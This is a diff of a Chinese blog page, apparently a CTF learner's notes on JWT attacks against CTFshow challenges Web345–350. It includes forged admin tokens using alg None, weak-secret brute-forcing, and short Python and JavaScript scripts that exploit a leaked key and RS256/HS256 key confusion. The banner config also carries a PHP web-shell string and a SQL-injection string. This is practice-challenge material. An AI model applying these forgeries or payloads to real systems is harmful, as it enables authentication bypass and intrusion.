@@ -1,120 +1,705 @@
-<!DOCTYPE html><html lang="zh"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="/images/icons/favicon-16x16.png?v=2.8.0" type="image/png" sizes="16x16"><link rel="icon" href="/images/icons/favicon-32x32.png?v=2.8.0" type="image/png" sizes="32x32"><meta name="description" content="CTF:JWT安全学习笔记">
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="yansui">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://yan5ui.github.io/2023/07/20/jwt/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="CTF:JWT安全学习笔记">
 <meta property="og:type" content="article">
 <meta property="og:title" content="JWT安全学习笔记">
 <meta property="og:url" content="http://yan5ui.github.io/2023/07/20/jwt/index.html">
 <meta property="og:site_name" content="yansui&#39;s blogs">
 <meta property="og:description" content="CTF:JWT安全学习笔记">
-<meta property="og:locale">
+<meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="http://yan5ui.github.io/JWT1.png">
 <meta property="og:image" content="http://yan5ui.github.io/JWT2.png">
 <meta property="article:published_time" content="2023-07-20T02:57:34.644Z">
 <meta property="article:modified_time" content="2023-07-20T03:00:02.897Z">
 <meta property="article:author" content="yansui">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://yan5ui.github.io/JWT1.png"><title>JWT安全学习笔记 | yansui's blogs</title><link ref="canonical" href="http://yan5ui.github.io/2023/07/20/jwt/"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.8.0"><link rel="stylesheet" href="css/custom.css"><script>var Stun = window.Stun || {};
-var CONFIG = {
-  root: '/',
-  algolia: undefined,
-  assistSearch: undefined,
-  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
-  sidebar: {"offsetTop":"20px","tocMaxDepth":6},
-  header: {"enable":true,"showOnPost":true,"scrollDownIcon":false},
-  postWidget: {"endText":true},
-  nightMode: {"enable":true},
-  back2top: {"enable":true},
-  codeblock: {"style":"default","highlight":"light","wordWrap":false},
-  reward: false,
-  fancybox: false,
-  zoomImage: {"gapAside":"20px"},
-  galleryWaterfall: undefined,
-  lazyload: false,
-  pjax: undefined,
-  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
-  shortcuts: undefined,
-  prompt: {"copyButton":"Copy","copySuccess":"Copy Success","copyError":"Copy Error"},
-  sourcePath: {"js":"js","css":"css","images":"images"},
-};
+<meta name="twitter:image" content="http://yan5ui.github.io/JWT1.png">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/uploads/favicon.png" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/uploads/favicon.png">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="/uploads/favicon.png">
+    <!--- Page Info-->
+    
+    <title>
+        
+            JWT安全学习笔记 -
+        
+        yansui&#39;s blogs
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
 
-window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 6.3.0"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">Home</span></a></div></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">yansui的小窝</div><div class="header-banner-info__subtitle">一个成长中的ctfer</div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content" id="content"><!-- Just used to judge whether it is an article page--><div id="is-post"></div><div class="post"><header class="post-header"><h1 class="post-title">JWT安全学习笔记</h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2023-07-20</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2023-07-20</span></span></div></header><div class="post-body">
-        <h1 id="CTF-JWT安全学习笔记"   >
-          <a href="#CTF-JWT安全学习笔记" class="heading-link"><i class="fas fa-link"></i></a><a href="#CTF-JWT安全学习笔记" class="headerlink" title="CTF:JWT安全学习笔记"></a>CTF:JWT安全学习笔记</h1>
-      <span id="more"></span>
+    
+<link rel="stylesheet" href="/fonts/fonts.css">
+
+    
+<link rel="stylesheet" href="/fonts/Satoshi/satoshi.css">
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+
+    <!--- Inject Part-->
+    
+    <script id="hexo-configurations">
+    let Global = window.Global || {};
+    Global.hexo_config = {"hostname":"yan5ui.github.io","root":"/","language":"zh-CN"};
+    Global.theme_config = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":true,"lazyload":true,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/uploads/light.png","dark":"/uploads/night.png"},"title":"~yansui的成长记录~","subtitle":{"text":["eval($_POST[1])","1' union select 1,2,database();--+"],"hitokoto":{"enable":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#FFC0CB","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"links":{"github":"https://github.com/yan5ui","instagram":null,"zhihu":"https://www.zhihu.com/people/yan-sui-52-46","twitter":null,"email":"yansuij@gmail.com"},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.3.0","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"links":null},"article_date_format":"auto","categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2023-6-27"};
+    Global.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"};
+    Global.data_config = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 6.3.0"></head>
 
 
-        <h2 id="一、什么是JWT"   >
-          <a href="#一、什么是JWT" class="heading-link"><i class="fas fa-link"></i></a><a href="#一、什么是JWT" class="headerlink" title="一、什么是JWT?"></a>一、什么是JWT?</h2>
-      <p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://blog.csdn.net/qq_39608382/article/details/127284893" >贴个链接吧</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
-<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://jwt.io/" >JWT编码解码网站</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<body>
+<div class="progress-bar-container">
+    
 
-        <h2 id="二、JWT安全"   >
-          <a href="#二、JWT安全" class="heading-link"><i class="fas fa-link"></i></a><a href="#二、JWT安全" class="headerlink" title="二、JWT安全"></a>二、JWT安全</h2>
-      <p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2338" >JWT攻击</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+    
+        <span class="pjax-progress-bar"></span>
+        <span class="swup-progress-icon">
+            <i class="fa-solid fa-circle-notch fa-spin"></i>
+        </span>
+    
+</div>
+
+
+<main class="page-container" id="swup">
+    
+
+    
+
+    <div class="main-content-container">
+        
+
+        <div class="main-content-header">
+            <header class="navbar-container">
+    
+    <div class="navbar-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                yansui&#39;s blogs
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-house"></i>
+                                        
+                                        首页
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile drawer -->
+    <div class="navbar-drawer">
+        <ul class="drawer-navbar-list">
+            
+                
+                    <li class="drawer-navbar-item flex-center">
+                        <a class="" 
+                        href="/"  >
+                             
+                                
+                                    <i class="fa-regular fa-house"></i>
+                                
+                                首页
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="main-content-body">
+
+            
+
+            <div class="main-content">
+
+                
+                    <div class="post-page-container">
+    <div class="article-content-container">
+
+        <div class="article-title">
+            
+                <h1 class="article-title-regular">JWT安全学习笔记</h1>
+            
+            </div>
+            
+                    
+        
+        
+            <div class="article-header">
+                <div class="avatar">
+                    <img src="/uploads/photo.jpg">
+                </div>
+                <div class="info">
+                    <div class="author">
+                        <span class="name">yansui</span>
+                        
+                            <span class="author-label">Lv2</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2023-07-20 10:57:34</span>
+        <span class="mobile">2023-07-20 10:57:34</span>
+        <span class="hover-info">创建</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2023-07-20 11:02</span>
+            <span class="mobile">2023-07-20 11:02</span>
+            <span class="hover-info">更新</span>
+        </span>
+    
+
+    
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        <div class="article-content markdown-body">
+            <h1 id="CTF-JWT安全学习笔记"><a href="#CTF-JWT安全学习笔记" class="headerlink" title="CTF:JWT安全学习笔记"></a>CTF:JWT安全学习笔记</h1><span id="more"></span>
+
+<h2 id="一、什么是JWT"><a href="#一、什么是JWT" class="headerlink" title="一、什么是JWT?"></a>一、什么是JWT?</h2><p><a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/qq_39608382/article/details/127284893" >贴个链接吧 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://jwt.io/" >JWT编码解码网站 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<h2 id="二、JWT安全"><a href="#二、JWT安全" class="headerlink" title="二、JWT安全"></a>二、JWT安全</h2><p><a class="link"   target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2338" >JWT攻击 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
 <p>在题目中出现的大致可以分为以下几类：</p>
 <p>更改加密算法为None,直接更改JWT中的内容</p>
 <p>爆破secret_key</p>
 <p>privite.key泄露</p>
 <p>更改加密算法为HS256，使用公钥进行签名和验证</p>
-
-        <h2 id="二、CTFshow-题解"   >
-          <a href="#二、CTFshow-题解" class="heading-link"><i class="fas fa-link"></i></a><a href="#二、CTFshow-题解" class="headerlink" title="二、CTFshow 题解"></a>二、CTFshow 题解</h2>
-      
-        <h3 id="Web345"   >
-          <a href="#Web345" class="heading-link"><i class="fas fa-link"></i></a><a href="#Web345" class="headerlink" title="Web345"></a>Web345</h3>
-      <p>可以拿到cookie:<br>auth&#x3D;eyJhbGciOiJOb25lIiwidHlwIjoiand0In0.W3siaXNzIjoiYWRtaW4iLCJpYXQiOjE2ODk1ODQ0MDUsImV4cCI6MTY4OTU5MTYwNSwibmJmIjoxNjg5NTg0NDA1LCJzdWIiOiJ1c2VyIiwianRpIjoiNjFjZmMxN2M3YmFiZjQzMmI3NzAwZDIxNDNjM2ZmMjAifV0</p>
+<h2 id="二、CTFshow-题解"><a href="#二、CTFshow-题解" class="headerlink" title="二、CTFshow 题解"></a>二、CTFshow 题解</h2><h3 id="Web345"><a href="#Web345" class="headerlink" title="Web345"></a>Web345</h3><p>可以拿到cookie:<br>auth&#x3D;eyJhbGciOiJOb25lIiwidHlwIjoiand0In0.W3siaXNzIjoiYWRtaW4iLCJpYXQiOjE2ODk1ODQ0MDUsImV4cCI6MTY4OTU5MTYwNSwibmJmIjoxNjg5NTg0NDA1LCJzdWIiOiJ1c2VyIiwianRpIjoiNjFjZmMxN2M3YmFiZjQzMmI3NzAwZDIxNDNjM2ZmMjAifV0</p>
 <p>解码可以得到：</p>
-<figure class="highlight json"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;alg&quot;</span><span class="punctuation">:</span><span class="string">&quot;None&quot;</span><span class="punctuation">,</span><span class="attr">&quot;typ&quot;</span><span class="punctuation">:</span><span class="string">&quot;jwt&quot;</span><span class="punctuation">&#125;</span>.<span class="punctuation">[</span><span class="punctuation">&#123;</span><span class="attr">&quot;iss&quot;</span><span class="punctuation">:</span><span class="string">&quot;admin&quot;</span><span class="punctuation">,</span><span class="attr">&quot;iat&quot;</span><span class="punctuation">:</span><span class="number">1689584405</span><span class="punctuation">,</span><span class="attr">&quot;exp&quot;</span><span class="punctuation">:</span><span class="number">1689591605</span><span class="punctuation">,</span><span class="attr">&quot;nbf&quot;</span><span class="punctuation">:</span><span class="number">1689584405</span><span class="punctuation">,</span><span class="attr">&quot;sub&quot;</span><span class="punctuation">:</span><span class="string">&quot;user&quot;</span><span class="punctuation">,</span><span class="attr">&quot;jti&quot;</span><span class="punctuation">:</span><span class="string">&quot;61cfc17c7babf432b7700d2143c3ff20&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">]</span></span><br></pre></td></tr></table></div></figure>
+<div class="highlight-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;alg&quot;</span><span class="punctuation">:</span><span class="string">&quot;None&quot;</span><span class="punctuation">,</span><span class="attr">&quot;typ&quot;</span><span class="punctuation">:</span><span class="string">&quot;jwt&quot;</span><span class="punctuation">&#125;</span>.<span class="punctuation">[</span><span class="punctuation">&#123;</span><span class="attr">&quot;iss&quot;</span><span class="punctuation">:</span><span class="string">&quot;admin&quot;</span><span class="punctuation">,</span><span class="attr">&quot;iat&quot;</span><span class="punctuation">:</span><span class="number">1689584405</span><span class="punctuation">,</span><span class="attr">&quot;exp&quot;</span><span class="punctuation">:</span><span class="number">1689591605</span><span class="punctuation">,</span><span class="attr">&quot;nbf&quot;</span><span class="punctuation">:</span><span class="number">1689584405</span><span class="punctuation">,</span><span class="attr">&quot;sub&quot;</span><span class="punctuation">:</span><span class="string">&quot;user&quot;</span><span class="punctuation">,</span><span class="attr">&quot;jti&quot;</span><span class="punctuation">:</span><span class="string">&quot;61cfc17c7babf432b7700d2143c3ff20&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">]</span></span><br></pre></td></tr></table></figure></div>
 
 <p>直接修改sub为admin，base64编码即可</p>
 <p>eyJhbGciOiJOb25lIiwidHlwIjoiand0In0.W3sic3ViIjoiYWRtaW4ifV0</p>
 <p>（不知道为啥，删掉.前面的部分才能利用成功）</p>
-
-        <h3 id="Web346"   >
-          <a href="#Web346" class="heading-link"><i class="fas fa-link"></i></a><a href="#Web346" class="headerlink" title="Web346"></a>Web346</h3>
-      <p>JWT:<br>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTY4OTU4NjEzMSwiZXhwIjoxNjg5NTkzMzMxLCJuYmYiOjE2ODk1ODYxMzEsInN1YiI6InVzZXIiLCJqdGkiOiJmNTc2MTg4NjA4YjBhZDU3YWExNzk3N2U4ZjdjMmQ5YiJ9.P9GiPawpM1sqfPdyBL435J1mSRK2CoUSUy0kj9hu0wA</p>
+<h3 id="Web346"><a href="#Web346" class="headerlink" title="Web346"></a>Web346</h3><p>JWT:<br>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTY4OTU4NjEzMSwiZXhwIjoxNjg5NTkzMzMxLCJuYmYiOjE2ODk1ODYxMzEsInN1YiI6InVzZXIiLCJqdGkiOiJmNTc2MTg4NjA4YjBhZDU3YWExNzk3N2U4ZjdjMmQ5YiJ9.P9GiPawpM1sqfPdyBL435J1mSRK2CoUSUy0kj9hu0wA</p>
 <p>加密算法改为None:<br>Header为eyJhbGciOiJOb25lIiwidHlwIjoiand0In0.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTY4OTU4NjEzMSwiZXhwIjoxNjg5NTkzMzMxLCJuYmYiOjE2ODk1ODYxMzEsInN1YiI6ImFkbWluIiwianRpIjoiZjU3NjE4ODYwOGIwYWQ1N2FhMTc5NzdlOGY3YzJkOWIifQ.</p>
 <p>再去掉sig，但是要保留.即可</p>
-
-        <h3 id="Web347"   >
-          <a href="#Web347" class="heading-link"><i class="fas fa-link"></i></a><a href="#Web347" class="headerlink" title="Web347"></a>Web347</h3>
-      <p>提示里边说是弱口令</p>
+<h3 id="Web347"><a href="#Web347" class="headerlink" title="Web347"></a>Web347</h3><p>提示里边说是弱口令</p>
 <p>拿到JWT:</p>
 <blockquote>
 <p>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTY4OTU4NjgyNiwiZXhwIjoxNjg5NTk0MDI2LCJuYmYiOjE2ODk1ODY4MjYsInN1YiI6InVzZXIiLCJqdGkiOiJiYTU3NGZmOTRlNjcxYTY0NWRjMTZjNDg4ZDNlMjI1OSJ9.qC7LSEn_ziQBrpHrJowBWis5H3LLFYrZY1q1IlhNeXs</p>
 </blockquote>
 <p>前面一样，后面对secret进行爆破<br>eyJhbGciOiJOb25lIiwidHlwIjoiand0In0.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTY4OTU4NjEzMSwiZXhwIjoxNjg5NTkzMzMxLCJuYmYiOjE2ODk1ODYxMzEsInN1YiI6ImFkbWluIiwianRpIjoiZjU3NjE4ODYwOGIwYWQ1N2FhMTc5NzdlOGY3YzJkOWIifQ.</p>
 <p>secret&#x3D;123456即可。</p>
-<p><img src="/JWT1.png"></p>
-
-        <h3 id="Web348"   >
-          <a href="#Web348" class="heading-link"><i class="fas fa-link"></i></a><a href="#Web348" class="headerlink" title="Web348"></a>Web348</h3>
-      <p>爆破secret</p>
-<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/brendan-rius/c-jwt-cracker" >爆破工具</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/JWT1.png"
+                     
+                ></p>
+<h3 id="Web348"><a href="#Web348" class="headerlink" title="Web348"></a>Web348</h3><p>爆破secret</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://github.com/brendan-rius/c-jwt-cracker" >爆破工具 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
 <p>需要在Kali中运行，完成后爆破，之后的步骤和上题相同。</p>
-<p><img src="/JWT2.png"></p>
-
-        <h3 id="Web349"   >
-          <a href="#Web349" class="heading-link"><i class="fas fa-link"></i></a><a href="#Web349" class="headerlink" title="Web349"></a>Web349</h3>
-      <p>拿到JWT:</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/JWT2.png"
+                     
+                ></p>
+<h3 id="Web349"><a href="#Web349" class="headerlink" title="Web349"></a>Web349</h3><p>拿到JWT:</p>
 <blockquote>
 <p>eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidXNlciIsImlhdCI6MTY4OTU4OTg0M30.X-9paL6uigd9YlXCxihK8qDfSe7lY50RgGfEgR7gqUuGKHZM7qrkTbJElQVsooU0zWzQrKyp3YaXjwx-RitFSQ6Lr1WIUfeOmYcd1nKdmcYzlDKUDlnVX6YyNW4TbpD6PvN5Dp0SohPdsT4eDCoC81qV4n7B-SoSdMl2Jl1bC7w</p>
 </blockquote>
 <p>试下加密算法为none:<br>payload:<br>eyJhbGciOiJOb25lIiwidHlwIjoiand0In0.eyJ1c2VyIjogImFkbWluIiwiaWF0IjogMTY4OTU4OTg0M30.</p>
 <p>python3版本的exp:</p>
-<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;./Web349/private.key&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    public = f.read()</span><br><span class="line"></span><br><span class="line">payload = &#123;<span class="string">&quot;user&quot;</span>: <span class="string">&quot;admin&quot;</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(jwt.encode(payload, key=public, algorithm=<span class="string">&#x27;RS256&#x27;</span>))</span><br></pre></td></tr></table></div></figure>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;./Web349/private.key&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    public = f.read()</span><br><span class="line"></span><br><span class="line">payload = &#123;<span class="string">&quot;user&quot;</span>: <span class="string">&quot;admin&quot;</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(jwt.encode(payload, key=public, algorithm=<span class="string">&#x27;RS256&#x27;</span>))</span><br></pre></td></tr></table></figure></div>
 
 <p>使用之前记得pip install pyJWT</p>
+<h3 id="Web350"><a href="#Web350" class="headerlink" title="Web350"></a>Web350</h3><p>exp.js:</p>
+<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> jwt = <span class="built_in">require</span>(<span class="string">&#x27;jsonwebtoken&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> privateKey = fs.<span class="title function_">readFileSync</span>(<span class="string">&#x27;public.key&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> token = jwt.<span class="title function_">sign</span>(&#123; <span class="attr">user</span>: <span class="string">&#x27;admin&#x27;</span> &#125;, privateKey, &#123; <span class="attr">algorithm</span>: <span class="string">&#x27;HS256&#x27;</span> &#125;);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(token)</span><br></pre></td></tr></table></figure></div>
+        </div>
 
-        <h3 id="Web350"   >
-          <a href="#Web350" class="heading-link"><i class="fas fa-link"></i></a><a href="#Web350" class="headerlink" title="Web350"></a>Web350</h3>
-      <p>exp.js:</p>
-<figure class="highlight javascript"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> jwt = <span class="built_in">require</span>(<span class="string">&#x27;jsonwebtoken&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> privateKey = fs.<span class="title function_">readFileSync</span>(<span class="string">&#x27;public.key&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> token = jwt.<span class="title function_">sign</span>(&#123; <span class="attr">user</span>: <span class="string">&#x27;admin&#x27;</span> &#125;, privateKey, &#123; <span class="attr">algorithm</span>: <span class="string">&#x27;HS256&#x27;</span> &#125;);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(token)</span><br></pre></td></tr></table></div></figure></div><footer class="post-footer"><div class="post-ending ending"><div class="ending__text">------ END ------</div></div><div class="post-copyright copyright"><div class="copyright-author"><span class="copyright-author__name">Author: </span><span class="copyright-author__value"><a href="http://yan5ui.github.io">yansui</a></span></div><div class="copyright-link"><span class="copyright-link__name">Link: </span><span class="copyright-link__value"><a href="http://yan5ui.github.io/2023/07/20/jwt/">http://yan5ui.github.io/2023/07/20/jwt/</a></span></div><div class="copyright-notice"><span class="copyright-notice__name">Copyright: </span><span class="copyright-notice__value">All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" rel="external nofollow" target="_blank">BY-NC-SA</a> unless stating additionally</span></div></div><nav class="post-paginator paginator"><div class="paginator-prev"><a class="paginator-prev__link" href="/2023/08/03/%E6%8E%A7%E5%AE%89%E5%91%A8%E8%B5%9B/"><span class="paginator-prev__icon"><i class="fas fa-angle-left"></i></span><span class="paginator-prev__text">TICPSH Week1</span></a></div><div class="paginator-next"><a class="paginator-next__link" href="/2023/07/17/nodejs%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/"><span class="paginator-prev__text">CTF Node.js学习</span><span class="paginator-next__icon"><i class="fas fa-angle-right"></i></span></a></div></nav></footer></div></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><section class="sidebar-toc hide"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#CTF-JWT%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0"><span class="toc-number">1.</span> <span class="toc-text">
-          CTF:JWT安全学习笔记</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E4%BB%80%E4%B9%88%E6%98%AFJWT"><span class="toc-number">1.1.</span> <span class="toc-text">
